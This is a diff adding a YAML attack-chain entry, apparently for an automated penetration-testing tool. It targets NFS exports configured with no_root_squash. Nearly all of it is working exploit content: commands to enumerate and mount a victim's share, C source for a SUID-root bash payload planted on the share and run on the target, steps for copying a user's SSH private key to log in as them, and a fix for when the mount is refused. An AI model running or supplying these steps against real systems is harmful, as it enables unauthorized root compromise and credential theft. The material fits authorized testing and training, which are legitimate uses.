@@ -1,0 +1,58 @@
+chain_id: nfs_no_squash
+title: "NFS — no_root_squash export → root file write → SUID escalation"
+severity: CRITICAL
+tags: [nfs, no-root-squash, suid, privesc]
+
+trigger:
+  any_of:
+    - { port: 2049 }
+    - { port: 111 }
+    - { service: nfs }
+    - { service_pattern: "(?i)nfs|rpcbind" }
+
+description: |
+  Open NFS service. Many badly-configured exports omit `root_squash`,
+  meaning a remote root mount writes files as the *real* server-side
+  root. Drop a SUID-bash on the share, mount on the target as a regular
+  user, run it — instant root.
+
+steps:
+  - id: 1
+    title: "Enumerate exports"
+    command: showmount -e $VICTIMA
+
+  - id: 2
+    title: "Mount the export locally as Kali root"
+    command: |
+      sudo mkdir -p /mnt/nfs
+      sudo mount -t nfs -o vers=3 $VICTIMA:/srv/share /mnt/nfs
+
+  - id: 3
+    title: "Write a SUID-root bash payload"
+    command: |
+      cat > /mnt/nfs/pwn.c << 'EOF'
+      int main() { setuid(0); setgid(0); system("/bin/bash -p"); }
+      EOF
+      gcc /mnt/nfs/pwn.c -o /mnt/nfs/pwn
+      chmod +s /mnt/nfs/pwn
+
+  - id: 4
+    title: "On the target, run the SUID bash"
+    command: /mountpoint/pwn
+
+  - id: 5
+    title: "Or steal an SSH key directly"
+    command: |
+      cp /home/USUARIO/.ssh/id_rsa /tmp/    # readable thanks to root mount
+      chmod 600 /tmp/id_rsa
+      ssh -i /tmp/id_rsa USUARIO@$VICTIMA
+
+common_errors:
+  - error: "mount.nfs: access denied by server while mounting"
+    solution: |
+      Server requires the mount source to come from a privileged port.
+      Add `-o resvport`:
+        sudo mount -o resvport,vers=3 $VICTIMA:/srv/share /mnt/nfs
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
